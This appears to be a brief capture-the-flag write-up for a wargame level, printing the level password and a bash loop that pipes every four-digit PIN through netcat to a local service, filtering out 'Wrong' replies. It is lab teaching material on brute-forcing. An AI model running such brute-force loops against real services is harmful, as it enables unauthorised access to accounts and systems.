Level password: `gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8`

For connecting and brute forcing, we could create a script for this:

```sh
for i in {0000..9999};
do
	echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 ${i}";
done | nc localhost 30002 | grep -v "Wrong"
```

We iterate from *0000* to *9999* using a for loop, then echo the password of the current level with the current iteration index. Then we pipe it into `netcat`. The invert grep `grep -v` allows us to filter for any output that doesn't contain the word *Wrong* in it, the word that indicates incorrect password. So we just grab output lines that are correct.